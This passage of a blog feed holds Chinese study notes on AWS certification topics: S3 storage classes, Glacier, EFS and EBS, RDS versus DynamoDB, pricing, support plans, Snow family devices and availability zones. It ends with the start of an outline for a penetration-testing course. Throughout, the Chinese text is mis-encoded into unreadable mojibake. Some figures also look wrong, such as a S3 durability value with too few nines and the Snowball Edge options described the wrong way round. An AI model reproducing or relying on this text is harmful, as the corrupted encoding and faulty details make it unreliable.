S3</h3><ul><li>è³‡æ–™å­˜æ”¾ä»¥<strong>ç‰©ä»¶</strong>å½¢å¼å­˜æ”¾ï¼Œä½†ä¸¦éå­˜æ”¾æ–¼æª”æ¡ˆç›®éŒ„ï¼Œè€Œæ˜¯å­˜æ”¾åœ¨<strong>å„²å­˜çœé«”(bucket)</strong></li><li>ä¸Šå‚³ç‰©ä»¶å¤§å°ä¸Šé™ç‚ºï¼š <strong>5TB</strong></li><li>å¯ä»¥å»ºç«‹**ç‰©ä»¶ç‰ˆæœ¬(Object Versioning)**ï¼Œé˜²æ­¢æ„å¤–åˆªé™¤</li><li>å¯ä»¥å»ºç«‹å¤šå€‹bucktï¼Œä¾†æ”¾åœ¨ä¸åŒè³‡æ–™é¡åˆ¥æˆ–æ˜¯è³‡æ–™å±¤ä¸­</li><li>å¯å»ºç«‹è¨±å¯(Permission)ä¾†é™åˆ¶èª°å¯ä»¥å­˜å–ç‰©ä»¶</li><li><code>Amazon S3 Standard</code>: å…·æœ‰ 99.99999999% è€ä¹…æ€§ï¼Œä»£è¡¨è©²æª”æ¡ˆåœ¨ä¸€å¹´å¾Œä¿æŒå®Œæ•´çš„æ©Ÿç‡<ul><li><code>è³‡æ–™å­˜æ”¾çš„æ–¹å¼</code>: è³‡æ–™è‡³å°‘æœƒå­˜æ”¾åœ¨ä¸‰å€‹è¨­æ–½ä¸­ï¼Œåœ¨ä¸åŒåœ°é»éƒ½æœ‰å‰¯æœ¬</li><li><code>éœæ…‹ç¶²ç«™è¨—ç®¡</code>: è¨—ç®¡htmlæª”æˆ–å…¶ä»–éœæ…‹æª”æ¡ˆè³‡ç”¢åˆ°s3</li></ul></li><li><code>Amazon S3 Standard-Infrequent(IA)</code>: ç”¨æ–¼å­˜å–é »ç‡ä½ï¼Œä½†éœ€è¦æ™‚éœ€è¦å¿«é€Ÿå­˜å–<ul><li>é©åˆå­˜æ”¾å‚™ä»½ã€ç½å®³å¾©åŸã€é•·æœŸå­˜æ”¾è³‡æ–™</li><li><code>Amazon S3 Glacier</code>: å¯ç”¨æ–¼ç¨½æ ¸è³‡æ–™é•·æœŸå­˜æ”¾</li><li>å¯å»ºç«‹æ–‡ä»¶åº«ï¼Œä¸¦ä½¿ç”¨<strong>æ–‡ä»¶åº«é–å®šæ”¿ç­–</strong>ï¼Œä¾†æ»¿è¶³ç•¶åœ°æ³•è¦å°æ–¼ç¨½æ ¸è³‡æ–™å­˜æ”¾å¹´é™çš„è¦æ±‚</li><li>å¯åœ¨æ–‡ä»¶åº«é–å®šæ”¿ç­–ä¸­ä½¿ç”¨æ§åˆ¶æªæ–½ - <strong>å–®å¯«å¤šè®€(WORM)</strong> æ¨¡å‹ï¼Œä¾†é˜²æ­¢æœªä¾†çš„å¯«å…¥è¡Œç‚º</li></ul></li><li>ç”Ÿå‘½é€±æœŸæ”¿ç­–: å¯åœ¨ä¸åŒå±¤ä¹‹é–“è‡ªå‹•ç§»å‹•è³‡æ–™<ul><li>ä¾‹å¦‚: éœ€è¦å°‡ä¸€å€‹ç‰©ä»¶åœ¨S3 Standardä¸­ä¿ç•™90å¤©ï¼Œæ¥ä¸‹ä¾†ç§»å‹•åˆ°s3-IAä¸­ä¿ç•™30å¤©ï¼Œ120å¤©å€™ç§»å‹•åˆ°s3 glacierï¼Œé€™ç¨®æ™‚å€™å°±èƒ½å¤ å»ºç«‹ç”Ÿå‘½é€±æœŸæ”¿ç­–ä¾†è‡ªå‹•åŒ–é€™äº›è¡Œç‚º</li></ul></li><li><code>Amazon S3 å–®å€åŸŸ-IA</code> <ul><li>è³‡æ–™å­˜æ”¾åœ¨å–®ä¸€å€åŸŸä¸­</li><li>åƒ¹æ ¼æ¯”S3 Standard-IAé‚„è¦ä½</li><li>è‹¥æƒ³è¦ç¯€çœå„²å­˜æˆæœ¬å‰‡é¸æ“‡æ­¤å„²å­˜é¡åˆ¥</li></ul></li><li><code>Amazon S3 Intelligent-Tiering</code><ul><li>é©åˆå­˜å–æ¨¡å¼æœªçŸ¥æˆ–æŒçºŒè®Šæ›´çš„è³‡æ–™</li><li>æ¯å€‹ç‰©ä»¶éœ€è¦æ”¯ä»˜å°é¡æ¯æœˆç›£æ§å’Œè‡ªå‹•åŒ–è²»ç”¨</li></ul></li><li>ç‰©ä»¶:</li><li><img src="https://i.imgur.com/fNAXd5H.png"></li></ul><h3 id="Amazon-S3-Glacier"><a href="#Amazon-S3-Glacier" class="headerlink" title="Amazon S3 Glacier"></a>Amazon S3 Glacier</h3><ul><li>å°ˆæœƒè³‡æ–™å°å­˜æ‰€è¨­è¨ˆ</li><li>èƒ½åœ¨å¹¾åˆ†é˜æˆ–å¹¾å°æ™‚å…§æ“·å–è³‡æ–™</li><li>å¯ç”¨æ–¼å„²å­˜å·²å°å­˜çš„å®¢æˆ¶è³‡æ–™æˆ–æ˜¯èˆŠç›¸ç‰‡å½±ç‰‡æª”æ¡ˆ</li></ul><h3 id="Amazon-S3-Glacier-Deep-Archive"><a href="#Amazon-S3-Glacier-Deep-Archive" class="headerlink" title="Amazon S3 Glacier Deep Archive"></a>Amazon S3 Glacier Deep Archive</h3><ul><li>é©åˆå°å­˜çš„æœ€ä½æˆæœ¬ç‰©ä»¶å„²å­˜é¡åˆ¥</li><li>èƒ½åœ¨12å°æ™‚å…§æ“·å–ç‰©ä»¶</li></ul><h3 id="Amazon-Elastic-File-System-Amazon-EFS"><a href="#Amazon-Elastic-File-System-Amazon-EFS" class="headerlink" title="Amazon Elastic File System (Amazon EFS)"></a>Amazon Elastic File System (Amazon EFS)</h3><ul><li>å…è¨±å¤šå€‹åŸ·è¡Œå€‹é«”åŒæ™‚å­˜å»EFSç•¶ä¸­çš„è³‡æ–™</li><li>å¯æ˜¯éœ€æ±‚æ“´å±•æˆ–ç¸®æ¸›</li></ul><h2 id="EBS-èˆ‡-S3çš„æ¯”è¼ƒ"><a href="#EBS-èˆ‡-S3çš„æ¯”è¼ƒ" class="headerlink" title="EBS èˆ‡ S3çš„æ¯”è¼ƒ"></a>EBS èˆ‡ S3çš„æ¯”è¼ƒ</h2><table><thead><tr><th></th><th>EBS</th><th>S3</th></tr></thead><tbody><tr><td>å„²å­˜å®¹é‡</td><td>16TB</td><td>ç„¡é™åˆ¶ï¼Œå€‹åˆ¥ç‰©ä»¶æœ€é«˜ç‚º5TB</td></tr><tr><td>ç‰¹è‰²</td><td>åœ¨EC2çµ‚æ­¢æ™‚ç¹¼çºŒå­˜æ´»</td><td>å–®å¯«å¤šè®€(WORM)</td></tr><tr><td>å„²å­˜å‹æ…‹</td><td>å›ºæ…‹</td><td></td></tr><tr><td>è€ä¹…åº¦</td><td></td><td>99.99999999%</td></tr><tr><td>ä½¿ç”¨æ¡ˆä¾‹</td><td>80GBå½±ç‰‡æª”æ¡ˆæ­£åœ¨ç·¨è¼¯ï¼Œå¯å•Ÿç”¨ç‰©ä»¶ç‰ˆæœ¬ç´€éŒ„ï¼Œè€Œä¸ç”¨æ¯æ¬¡éƒ½é‡æ–°ä¸Šå‚³å…¨æ–°çš„ç‰©ä»¶ï¼Œæ¡ç”¨å€å¡Šå¼å„²å­˜</td><td>éœæ…‹ç¶²ç«™è¨—ç®¡ã€å€åŸŸåˆ†æ•£å¼å„²å­˜ã€è³‡æ–™å‚™ä»½ã€ç„¡ä¼ºæœå™¨</td></tr><tr><td>ç¸½çµæ¡ˆä¾‹</td><td>è¤‡é›œå¯«å…¥è®€å–æ›´å‹•ç­‰åŠŸèƒ½</td><td>å®Œæ•´ç‰©ä»¶ã€å¶è€Œæ›´å‹•ç­‰è³‡æ–™</td></tr></tbody></table><h2 id="EBS-èˆ‡-EFSçš„å·®åˆ¥"><a href="#EBS-èˆ‡-EFSçš„å·®åˆ¥" class="headerlink" title="EBS èˆ‡ EFSçš„å·®åˆ¥"></a>EBS èˆ‡ EFSçš„å·®åˆ¥</h2><ul><li>EBSç£ç¢Ÿå€æœƒé€£æ¥åˆ°EC2ï¼Œè€ŒEBSæ˜¯ <strong>å¯ç”¨å€åŸŸå±¤ç´šè³‡æº</strong>ï¼Œè‹¥è¦å°‡EC2é€£æ¥åˆ°EBSä¸Šï¼Œå…©è€…å¿…é ˆä½æ–¼ç›¸åŒå¯ç”¨å€åŸŸç•¶ä¸­</li><li>EBSæ˜¯ç¡¬ç¢Ÿï¼Œå¯å­˜æ”¾æª”æ¡ˆè³‡æ–™ã€è³‡æ–™åº«æˆ–æ‡‰ç”¨ç¨‹å¼ï¼Œç¡¬ç¢Ÿå€å¡æ»¿å¾Œï¼Œä¸¦ä¸æœƒè³‡å‹•æ“´å±•</li><li>EFSä¸¦ä¸æ˜¯ä¸€å€‹ç©ºç™½çš„ç¡¬ç¢Ÿï¼Œè€Œæ˜¯çœŸæ­£çš„Linuxæª”æ¡ˆç³»çµ±</li><li>EFSæ˜¯ä¸€ç¨®<strong>å€åŸŸæ€§è³‡æº</strong>ï¼Œå€åŸŸå…§çš„ä»»ä½•EC2éƒ½èƒ½å¤ å¯«å…¥EFSæª”æ¡ˆç³»çµ±</li><li>EFSå¯«å…¥æ›´å¤šè³‡æ–™æ™‚ï¼Œå®ƒæœƒè‡ªå‹•æ“´å±•</li></ul><h2 id="RDS-å’Œ-DynamoDBçš„å·®åˆ¥"><a href="#RDS-å’Œ-DynamoDBçš„å·®åˆ¥" class="headerlink" title="RDS å’Œ DynamoDBçš„å·®åˆ¥"></a>RDS å’Œ DynamoDBçš„å·®åˆ¥</h2><table><thead><tr><th>RDS</th><th>DynamoDB</th></tr></thead><tbody><tr><td>è‡ªå‹•é«˜å¯ç”¨æ€§ã€å¯æä¾›å¾©åŸ</td><td>éµå€¼å°ï¼Œä¸é ˆçµæ§‹æ€§æè¿°</td></tr><tr><td>å®¢æˆ¶æ“æœ‰è³‡æ–™æ‰€æœ‰æ¬Š</td><td>å·¨å¤§å‚³è¼¸å®¹é‡</td></tr><tr><td>å®¢æˆ¶æ“æœ‰æè¿°æ‰€æœ‰æ¬Š(Schema)</td><td>PBç´šå¤§å°æ“´å±•æ½›åŠ›</td></tr><tr><td>å®¢æˆ¶å°ç¶²è·¯æœ‰æ§åˆ¶æ¬Š</td><td>ç²¾å¯†APIå­˜å–æ¬Šé™</td></tr></tbody></table><p>ä½¿ç”¨æ¡ˆä¾‹:</p><ul><li>éŠ·å”®ä¾›æ‡‰éˆç®¡ç†ç³»çµ±ï¼Œè‹¥è¦é€²è¡Œå•†æ¥­åˆ†æï¼Œå‰‡éœ€è¦è¤‡é›œçš„é—œè¯å¼é€£çµï¼Œé€™æ™‚å°±é©åˆä½¿ç”¨RDS</li><li>ä¸Šè¿°æ¡ˆä¾‹å¤–çš„å…¶ä»–æ¡ˆä¾‹ï¼ŒDynamoDBå¹¾ä¹éƒ½å¯ç”¨ï¼Œå¤§å¤šæ¡ˆä¾‹ä¸éœ€è¦è¤‡é›œçš„é—œè¯å¼é€£çµï¼Œåƒæ˜¯å“¡å·¥è¯çµ¡äººè¡¨æ ¼ï¼Œç”¨å–®ä¸€è¡¨æ ¼å°±èƒ½å¤ è§£æ±ºäº†ï¼ŒRDSçš„è¤‡é›œåŠŸèƒ½ä»¥åŠç®¡ç†è²»ç”¨ï¼ŒDynamoDBå‰‡èƒ½å¤ æ¶ˆé™¤æ‰€æœ‰ç®¡ç†è²»ç”¨ï¼Œä¸¦ä¸”å¯å»ºç«‹å¿«é€Ÿé«˜æ•ˆèƒ½çš„è³‡æ–™åº«</li></ul><h2 id="å®šåƒ¹"><a href="#å®šåƒ¹" class="headerlink" title="å®šåƒ¹"></a>å®šåƒ¹</h2><ul><li>å…è²»æ–¹æ¡ˆ:<ul><li>æ°¸é å…è²»<ul><li>AWS Lamdaæ¯å€‹æœˆå…è¨±ä¸€ç™¾è¬æ¬¡å…è²»å‘¼å«</li></ul></li><li>12å€‹æœˆå…è²»<ul><li>S3 å¯å…è²»ä½¿ç”¨12å€‹æœˆé«˜é”5GBçš„å„²å­˜</li></ul></li><li>æŸäº›æœå‹™å¯ä»¥çŸ­æœŸè©¦ç”¨<ul><li>Lightsaul æä¾›ä¸€å€‹æœˆçš„è©¦ç”¨æœŸï¼Œä½¿ç”¨æœŸé–“æœ€é«˜å¯é”750å°æ™‚</li></ul></li></ul></li><li>Pricing Model<ul><li>Pay-as-you-go æŒ‰ç…§ä½¿ç”¨é‡ä»˜è²»ï¼Œç„¡é ˆé•·æœŸåˆç´„</li><li>é ç•™å®¹é‡</li><li>ä»¥é‡è¨ˆç®—çš„æŠ˜æ‰£: æŸäº›æœå‹™æä¾›åˆ†ç´šå®šåƒ¹ï¼Œæ¯å–®ä½æˆæœ¬éš¨è‘—ç”¨é‡å¢åŠ è€Œé™ä½<ul><li>Ex. S3å„²å­˜ç©ºé–“è¶Šå¤šï¼Œæ¯GBæ”¯ä»˜è²»ç”¨å°±è¶Šå°‘</li></ul></li></ul></li><li>å®šåƒ¹è¨ˆç®—æ©Ÿ</li><li>å¸³å–®å„€è¡¨æ¿<ul><li>å­˜å– Cost Explorer ä¸¦å»ºç«‹é ç®—</li><li>å°‡æ‚¨æœ¬æœˆä»½è‡³ä»Šçš„é¤˜é¡èˆ‡ä¸Šå€‹æœˆé€²è¡Œæ¯”è¼ƒï¼Œä¸¦æ ¹æ“šç›®å‰çš„ç”¨é‡ç²å¾—ä¸‹å€‹æœˆçš„é æ¸¬</li><li>æª¢è¦–å„é …æœå‹™å…è²»æ–¹æ¡ˆç”¨é‡</li><li>ç™¼å¸ƒ AWS æˆæœ¬å’Œç”¨é‡å ±å‘Š</li></ul></li><li>åˆä½µå¸³å–®<ul><li>ç‚ºAWS Organizationçš„åŠŸèƒ½ä¹‹ä¸€</li><li>å¯ä»¥å°‡å€‹åˆ¥awså¸³æˆ¶çš„å¸³å–®åˆä½µï¼ŒË‡ä½†é‚„æ˜¯å¯ä»¥åˆ†é …æŸ¥çœ‹å¸³å–®</li><li>å¯ä»¥å°‡AWSè³‡æºçš„ä½¿ç”¨é‡å½™ç¸½åˆ°çµ„ç¹”å±¤ç´š</li><li>å€‹åˆ¥å¸³æˆ¶å¸³å–®å³ä½¿é‡‘é¡ä½ï¼Œè‹¥åˆä½µçµ„ç¹”ä¸­çš„å¸³å–®æœ‰æ©Ÿæœƒç²å¾—æ‰¹é‡æŠ˜æ‰£åƒ¹</li><li>ç°¡åŒ–è¨ˆè²»æµç¨‹</li><li>å…è²»åŠŸèƒ½</li><li>ä¸€å€‹çµ„ç¹”å…è¨±çš„é è¨­å¸³æˆ¶æ•¸ç›®ä¸Šé™ç‚º 4 å€‹</li></ul></li><li>é ç®—æœå‹™<ul><li>å¯ä»¥å»ºç«‹é ç®—é‡‘é¡é–¥å€¼ï¼Œä¸¦ç™¼å‡ºè­¦ç¤ºæé†’åˆ°é›»å­éƒµä»¶ä¸­ </li><li>é ç®—ä¸­çš„è³‡è¨Šæ¯å¤©æ›´æ–°ä¸‰æ¬¡</li></ul></li><li>Cost Explorer<ul><li>ä»¥æ§åˆ¶å°ç‚ºåŸºç¤çš„æœå‹™ï¼Œå¯é€éè¦–è¦ºåŒ–ä¾†æŸ¥çœ‹è·Ÿåˆ†æåœ¨awsä¸Šçš„èŠ±è²»</li><li>æœƒé¡¯ç¤ºåœ¨å“ªå€‹æœå‹™ä¸ŠåŒ–æœ€å¤šéŒ¢</li><li>ä¸¦æä¾›12å€‹æœˆçš„æ­·å²è³‡æ–™ï¼Œå¯è¿½è¹¤æˆæœ¬éš¨æ™‚é–“çš„è®ŠåŒ–</li><li>æä¾›å¼·å¤§çš„å ±è¡¨ï¼Œä¹Ÿå¯è‡ªå®šç¾©å ±è¡¨å…§å®¹</li></ul></li></ul><h2 id="Support-æœå‹™"><a href="#Support-æœå‹™" class="headerlink" title="Support æœå‹™"></a>Support æœå‹™</h2><ul><li>åŸºæœ¬æ”¯æ´(å…è²»)<ul><li>24å°æ™‚å®¢æœæœå‹™</li><li>æ–‡ä»¶ã€ç™½çš®æ›¸ã€è«–å£‡</li><li>AWS Trusted Advisor</li><li>AWS Personal Health Dashboard</li></ul></li><li>é–‹ç™¼äººå“¡æ–¹æ¡ˆ<ul><li>åŸºæœ¬æ”¯æ´</li><li>é›»å­éƒµä»¶å–å¾—å®¢æˆ¶æ”¯æ´(12å°æ™‚å›è¦†)</li></ul></li><li>å•†æ¥­æ”¯æ´<ul><li>åŸºæœ¬èˆ‡é–‹ç™¼äººå“¡æ”¯æ´</li><li>AWS Trusted Advisoræä¾›å®Œæ•´æœ€ä½³å¯¦è¸æª¢æŸ¥</li><li>ç›´æ¥èˆ‡é›²ç«¯æ”¯æ´å·¥ç¨‹å¸«é›»è©±è¯çµ¡(4å°æ™‚çš„å›æ‡‰SLA)</li><li>è‹¥ç”Ÿç”¢ç³»çµ±å—æï¼Œé‡å°æå£çš„ç”Ÿç”¢ç³»çµ±æä¾›1å°æ™‚çš„SLA</li><li>åŸºç¤è¨­æ–½äº‹ä»¶ç®¡ç†(EX.å¤§å‹æ´»å‹•ã€å…¨çƒç™¼å¸ƒæœƒâ€¦etc)</li></ul></li><li>ä¼æ¥­æ”¯æ´(é©åˆåŸ·è¡Œé—œéµä»»å‹™å·¥ä½œè² è¼‰çš„å…¬å¸)<ul><li>åŸºæœ¬ã€é–‹ç™¼äººå“¡å’Œå•†æ¥­æ”¯æ´(å¤–åŠ é‡å°å•†æ¥­é—œéµå·¥ä½œè² è¼‰çš„15åˆ†é˜SLA)</li><li>é©ç”¨æ–¼TAM(Technical Account Manager)çš„æŠ€è¡“å¸³æˆ¶ç®¡ç†å“¡<ul><li>TAMæœƒèˆ‡å®¢æˆ¶ä¸€åŒæ ¹æ“šWell-Architected æ¶æ§‹ä¾†æª¢è¦–ä¼æ¥­æ¶æ§‹</li></ul></li></ul></li></ul><p><img src="https://i.imgur.com/r20KK1m.png"></p><h2 id="AWS-Marketplace"><a href="#AWS-Marketplace" class="headerlink" title="AWS Marketplace"></a>AWS Marketplace</h2><ul><li>æ˜¯åŒ…å«ç¨ç«‹è»Ÿé«”é–‹ç™¼å» å•†æ•¸åƒç¨®è»Ÿé«”ç”¢å“çš„æ•¸ä½å‹éŒ„ï¼Œå¯ç°¡åŒ–ã€éƒ¨ç½²å’Œç®¡ç†åœ¨AWSæ¶æ§‹ä¸­åŸ·è¡Œç¬¬ä¸‰æ–¹è»Ÿé«”çš„æ­¥é©Ÿ</li><li>æ‚¨å¯ä»¥ä½¿ç”¨ AWS Marketplace å°‹æ‰¾ã€æ¸¬è©¦å’Œè³¼è²·èƒ½åœ¨ AWS ä¸ŠåŸ·è¡Œçš„è»Ÿé«”</li><li>ç•¶å®¢æˆ¶åœ¨ä½¿ç”¨Marketplaceä¸­çš„ç¬¬ä¸‰æ–¹æ‡‰ç”¨æ™‚ï¼Œç„¡éœ€å»ºæ§‹å®‰è£ç¶­è­·é€™äº›ç¨‹å¼æ‰€éœ€çš„åŸºç¤è¨­æ–½</li><li>ä¸€éµå¼éƒ¨ç½²</li><li>ä¸€æ¨£æŒ‰ä½¿ç”¨é‡ä»˜è²»</li><li>è¨±å¤šå» å•†æä¾›å…è²»è©¦ç”¨</li><li>ä»¥ä¼æ¥­ç‚ºä¸»çš„åŠŸèƒ½<ul><li>å¯è‡ªè¨‚æ¢æ¬¾å’Œå®šåƒ¹ï¼Œå¯ç®¡ç†è‡ªè¨‚æˆæ¬Šåˆç´„</li><li>ç§äººå¸‚é›†ï¼Œå¯å»ºç«‹ç¬¦åˆç•¶åœ°æ³•è¦æˆ–å®‰å…¨è¦æ±‚çš„é å…ˆæ ¸å‡†è»Ÿé«”æ±ºæ–¹æ¡ˆç›®éŒ„</li><li>æ•´åˆæ¡è³¼ç³»çµ±</li><li>awsæˆæœ¬ç®¡ç†å·¥å…·</li></ul></li></ul><h2 id="AWS-Cloud-Adoption-Framework-AWS-CAF"><a href="#AWS-Cloud-Adoption-Framework-AWS-CAF" class="headerlink" title="AWS Cloud Adoption Framework(AWS CAF)"></a>AWS Cloud Adoption Framework(AWS CAF)</h2><ul><li>å‘å®¢æˆ¶å…¬å¸æä¾›å»ºè­°ï¼Œè—‰ç”±æŒ‡å¼•å”åŠ©å®¢æˆ¶ç®¡ç†é·ç§»è‡³é›²ç«¯çš„éç¨‹</li><li>AWS CAFè§€é»(ä¸åŒé ˜åŸŸçš„äººå¸¶ä¾†ä¸åŒè§€é»ï¼Œä¸¦ä¸”æœƒæœ‰ä¸åŒçš„é·ç§»ç­–ç•¥)<ul><li>å•†æ¥­: å´é‡å•†æ¥­èƒ½åŠ›</li><li>äººå“¡: å´é‡å•†æ¥­èƒ½åŠ›</li><li>æ²»ç†: å´é‡å•†æ¥­èƒ½åŠ›</li><li>å¹³å°: æŠ€è¡“èƒ½åŠ›</li><li>å®‰å…¨: æŠ€è¡“èƒ½åŠ›</li><li>ç‡Ÿé‹: æŠ€è¡“èƒ½åŠ›</li></ul></li></ul><h2 id="é·ç§»ç­–ç•¥"><a href="#é·ç§»ç­–ç•¥" class="headerlink" title="é·ç§»ç­–ç•¥"></a>é·ç§»ç­–ç•¥</h2><ul><li>6å€‹Rç­–ç•¥<ul><li>é‡æ–°è¨—ç®¡(Rehosting)<ul><li>é¸å–æ‡‰ç”¨ç¨‹å¼å¹¾ä¹ç…§æ¬åˆ°AWS</li><li>åƒ…é€éé‡æ–°è¨—ç®¡èƒ½å¤ ç¯€çœé«˜é”30%çš„ç¸½æˆæœ¬</li></ul></li><li>å¹³å°é‡å»º&#x2F;å¾®èª¿æ¬é·<ul><li>æœƒé€²è¡Œä¸€äº›é›²ç«¯æœ€ä½³åŒ–ï¼Œä½†ä¸éœ€è¦èª¿æ•´æ ¸å¿ƒç¨‹å¼ç¢¼</li></ul></li><li>æ±°æ›(Retired)<ul><li>æŸäº›ä¼æ¥­çš„itç”¢å“çµ„åˆä¸­åŒ…å«ä¸å†ä½¿ç”¨çš„æ‡‰ç”¨ç¨‹å¼</li></ul></li><li>ä¿ç•™(Retain)<ul><li>æŸäº›æ‡‰ç”¨ç¨‹å¼éœ€è¦è¢«å–ä»£ï¼Œä½†æ™‚æ©Ÿæœªåˆ°ï¼Œå¯èƒ½é‚„æœƒå†è·‘å¥½å¹¾å€‹æœˆ</li><li>é€™äº›æ‡‰ç”¨å°±å¯é·ç§»åˆ°aws</li></ul></li><li>é‡æ–°è³¼è²·(Repurchase)<ul><li>æ”¾æ£„èˆŠæœ‰æˆæ¬Šè»Ÿé«”ï¼Œè½‰ç”¨é›²ç«¯åŸç”Ÿç”¢å“ç­‰</li><li>å‰æœŸæˆæœ¬é«˜ï¼Œä½†æ½›åœ¨ç›Šè™•å¤§</li></ul></li><li>é‡æ§‹(Refactor)<ul><li>é‡å¯«ç¨‹å¼ç¢¼</li><li>æŸäº›åŠŸèƒ½å¯èƒ½æ˜¯ä»¥å‰ç„¡æ³•å†å…§éƒ¨éƒ¨ç½²çš„</li></ul></li></ul></li></ul><h2 id="AWS-Snow-Family"><a href="#AWS-Snow-Family" class="headerlink" title="AWS Snow Family"></a>AWS Snow Family</h2><p>çš†é˜²ç«„æ”¹ï¼Œçš†ç”±å®¢æˆ¶çš„256bité‡‘é‘°ä¾†å°è³‡æ–™é€²è¡ŒåŠ å¯†<br><img src="https://i.imgur.com/2lh2GeS.png"></p><h3 id="AWS-Snowcone"><a href="#AWS-Snowcone" class="headerlink" title="AWS Snowcone"></a>AWS Snowcone</h3><ul><li>æœ€å¤šå¯å®¹ç´8TBçš„è³‡æ–™ä¸¦åŒ…å«<strong>é‚Šç·£é‹ç®—(åŒ…å«EC2å’ŒAWS IOT Greengrass)</strong></li><li>å¯ä»¥é€éawsä¸»æ§å°ä¸‹å–®è£ç½®</li><li>å®¢æˆ¶å¯ä»¥å®‰è£è£ç½®ä¸¦è¤‡è£½è³‡æ–™å†é‹å›aws</li><li>awså†å°‡è³‡æ–™è¤‡è£½åˆ°awså¸³æˆ¶ä¸­çš„s3 bucket</li><li>8TB,4G RAM, 2CPU</li></ul><h3 id="AWS-Snowball-Edge"><a href="#AWS-Snowball-Edge" class="headerlink" title="AWS Snowball Edge"></a>AWS Snowball Edge</h3><ul><li>å…©ç¨®é¸é …<ul><li>Compute Optimized:<ul><li>é©åˆå¤§è¦æ¨¡è³‡æ–™é·ç§»ä»¥åŠé€±æœŸæ€§å‚³è¼¸å·¥ç¨‹</li><li>80TB</li></ul></li><li>Storage Optimized: <ul><li>é©åˆæ©Ÿå™¨å­¸ç¿’ã€å…¨å‹•æ…‹å½±ç‰‡åˆ†æä»¥åŠæœ¬æ©Ÿé‹ç®—å †ç–Š</li><li>80TB</li></ul></li></ul></li><li>å¯ä»¥æ”¾å…¥ç¾æœ‰ä¼ºæœå™¨æ©Ÿæ¶</li><li>ä¸¦å¯ä½¿ç”¨ec2æˆ–iot Greengrasåšé‹ç®—</li><li>ä½¿ç”¨æ¡ˆä¾‹<ul><li>Iotè£ç½®ä¸²æµ</li><li>å½±ç‰‡è½‰ç¢¼</li><li>å·¥æ¥­è¨Šè™Ÿè™•ç†</li></ul></li></ul><h3 id="AWS-Snowmobile"><a href="#AWS-Snowmobile" class="headerlink" title="AWS Snowmobile"></a>AWS Snowmobile</h3><ul><li>è£ç½®åœ¨45è‹±å°ºé«˜çš„å·¨å¤§å®¹å™¨ä¸­</li><li>ç”±å¡è»Šé‹é€</li><li>å®¹ç´100PB(100000TB)çš„è³‡æ–™</li><li>è£ç½®é˜²ç«„æ”¹ã€é˜²æ°´ã€æ»…ç«ï¼Œå…·æœ‰æº«åº¦æ§åˆ¶åŠŸèƒ½</li><li>å®‰å…¨åœ˜éšŠè¦–è¨Šç›£æ§è­·å®‹åœ˜éšŠ</li></ul><h2 id="å¯ç”¨å€åŸŸ-Avaiable-Zone"><a href="#å¯ç”¨å€åŸŸ-Avaiable-Zone" class="headerlink" title="å¯ç”¨å€åŸŸ(Avaiable Zone)"></a>å¯ç”¨å€åŸŸ(Avaiable Zone)</h2><p><img src="https://i.imgur.com/l3j0kFf.png"><br>AZæ˜¯å€åŸŸå…§çš„ä¸€å€‹è³‡æ–™ä¸­å¿ƒæˆ–ä¸€çµ„è³‡æ–™ä¸­å¿ƒã€‚å¯ç”¨å€åŸŸå„è‡ªåè½æ–¼å½¼æ­¤çš„æ•¸åè‹±é‡Œå¤–ã€‚é€™å€‹è·é›¢å¤ è¿‘ï¼Œè¶³ä»¥åœ¨å¯ç”¨å€åŸŸä¹‹é–“ç¶­æŒä½å»¶é² (å…§å®¹å¾è«‹æ±‚åˆ°æ¥æ”¶ä¹‹é–“çš„æ™‚é–“)ã€‚ä¸éï¼Œå¦‚æœå€åŸŸä¸­çš„ä¸€éƒ¨åˆ†ç™¼ç”Ÿç½é›£ï¼Œå®ƒå€‘çš„è·é›¢ä¹Ÿå¤ é ï¼Œè¶³ä»¥é™ä½å¤šå€‹å¯ç”¨å€åŸŸå—åˆ°å½±éŸ¿çš„æ©Ÿæœƒã€‚</p><h2 id="ç¯€é»"><a href="#ç¯€é»" class="headerlink" title="ç¯€é»"></a>ç¯€é»</h2><p>æ˜¯é€é CloudFront ä¾†å°‡æ‚¨å…§å®¹çš„å¿«å–å‰¯æœ¬å­˜æ”¾åœ¨æ›´é è¿‘å®¢æˆ¶ä½ç½®çš„ç«™é»ï¼Œä»¥ä¾¿åŠ å¿«äº¤ä»˜<br><img src="https://i.imgur.com/LEbdL9B.png"></p>]]></content>
      
      
      <categories>
          
          <category> å­¸ç¿’ç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Certificate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯¦ç¿’ç­†è¨˜-æ»²é€æ¸¬è©¦èª²ç¨‹</title>
      <link href="/posts/8ec27a58.html"/>
      <url>/posts/8ec27a58.html</url>
      
        <content type="html"><![CDATA[<p>èª²ç¨‹å…§å®¹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- WebåŸºæœ¬çŸ¥è­˜</span><br><span class="line">- ä¸»å‹•/è¢«å‹•è³‡è¨Šæ”¶é›†</span><br><span class="line">- å¸¸è¦‹çš„webæ¼æ´</span><br><span class="line">- é¶æ©Ÿ</span><br><span class="line">- DVWAï¼ˆDamn Vulnerable Web Applicationï¼‰</span><br><span class="line">- RF(ç„¡ç·šå°„é »)æ»²é€æ¸¬è©¦(ç‰©è¯ç¶²)</span><br><span class="line">- åŸºæœ¬çš„é€šè¨Šå”å®š</span><br><span class="line">- è»Ÿé«”å®šç¾©ç„¡ç·šé›»SDR</span><br></pre></td></tr></table></figure><h2 id="PT-æ»²é€æ¸¬è©¦-vs-RT-ç´…éšŠæ¼”ç·´"><a href="#PT-æ»²é€æ¸¬è©¦-vs-RT-ç´…éšŠæ¼”ç·´" class="headerlink" title="PT(æ»²é€æ¸¬è©¦) vs RT(ç´…éšŠæ¼”ç·´)"></a>PT(æ»²é€æ¸¬è©¦) vs RT(ç´…éšŠæ¼”ç·´)</h2><ul><li>PT:ç¯„åœè¼ƒå°ï¼Œä¸”ç„¡æ³•é‡å°ç¤¾äº¤å·¥ç¨‹ ex.æŸå€‹ç¶²é </li><li>RT:ç¯„åœè¼ƒå¤§ 